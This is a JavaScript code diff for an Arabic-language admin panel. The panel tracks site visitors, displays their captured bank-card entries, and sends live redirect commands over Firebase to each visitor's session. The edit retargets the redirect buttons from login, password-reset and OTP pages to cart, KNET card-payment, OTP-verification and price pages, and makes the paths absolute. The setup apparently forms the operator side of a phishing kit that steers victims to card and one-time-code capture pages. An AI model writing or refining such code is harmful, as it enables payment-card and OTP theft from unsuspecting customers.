@@ -805,7 +805,7 @@
       .sort((a, b) => (b.time || 0) - (a.time || 0))
       .map(s => s.html)
       .join('') + basicBoxHtml;
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="wait">صفحة الانتظار</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="cart">السلة</button><button data-ref-nav="knet">الدفع (بطاقة)</button><button data-ref-nav="verification">التحقق OTP</button><button data-ref-nav="prices">أسعار اليوم</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="cart">السلة</option><option value="knet">الدفع (بطاقة)</option><option value="verification">التحقق OTP</option><option value="prices">أسعار اليوم</option><option value="terms">الشروط والأحكام</option><option value="privacy">سياسة الخصوصية</option><option value="returns">سياسة الاسترجاع</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -839,30 +839,29 @@
       navigator.clipboard.writeText(value).then(() => toast('تم نسخ: ' + value, 'success')).catch(() => toast('تعذر النسخ', 'error'));
     };
     els.referenceDetailContent.classList.remove('hidden');
+    // مطابقة أزرار التوجيه لصفحات موقع العملاء الفعلية (كانت تشير لصفحات غير موجودة)
+    // مسارات مطلقة حتى يعمل التوجيه من أي صفحة عميقة (مثل /product/<id>/<slug>)
     const NAV_PAGE_MAP = {
-      home: 'index.html',
-      loan: 'loan.html',
-      shop: 'shop.html',
-      watch: 'watch.html',
-      refund: 'refund.html',
-      wait: 'wait1.html',
-      login: 'login.html',
-      forgot: 'forgot-password.html',
-      otpcode: 'otp.html',
-      orders: 'order1.html',
-      knet: 'knet.html',
-      verification: 'verification.html',
-      card: 'card-payment.html',
-      otp: 'otpcredit_card_page.html',
+      home: '/index.html',
+      cart: '/cartepage.html',
+      knet: '/knet.html',
+      verification: '/verification.html',
+      prices: '/prices.html',
+      terms: '/terms.html',
+      privacy: '/privacy.html',
+      returns: '/returns.html',
     };
     // إرسال أمر توجيه للعميل عبر RTDB commands/{sessionId}/redirect
     // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة) فيستقبله العميل
     const sendNavCommand = (prettyLabel, targetPage) => {
       const docId = visitor.sessionId || visitor.id;
+      // توحيد المسار: صفحة نسبية → مسار مطلق حتى يعمل التوجيه من أي صفحة عميقة
+      let page = String(targetPage || '').trim();
+      if (page && !/^https?:\/\//i.test(page) && page.charAt(0) !== '/') page = '/' + page;
       const cmdRef = rtd.ref('commands/' + docId + '/redirect');
       cmdRef.set({
         action: 'REDIRECT_PAGE',
-        targetPage: targetPage,
+        targetPage: page,
         seq: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
         timestamp: new Date().toLocaleTimeString('ar-EG'),
         adminId: 'admin',
@@ -875,7 +874,8 @@
     els.referenceDetailContent.querySelectorAll('[data-ref-nav]').forEach(btn => btn.addEventListener('click', () => {
       const target = btn.dataset.refNav;
       const targetPage = NAV_PAGE_MAP[target] || target;
-      sendNavCommand(target, targetPage);
+      const label = (btn.textContent || '').trim() || target;
+      sendNavCommand(label, targetPage);
     }));
     const freeInput = els.referenceDetailContent.querySelector('[data-ref-nav-free]');
     const freeGo = els.referenceDetailContent.querySelector('[data-ref-nav-free-go]');
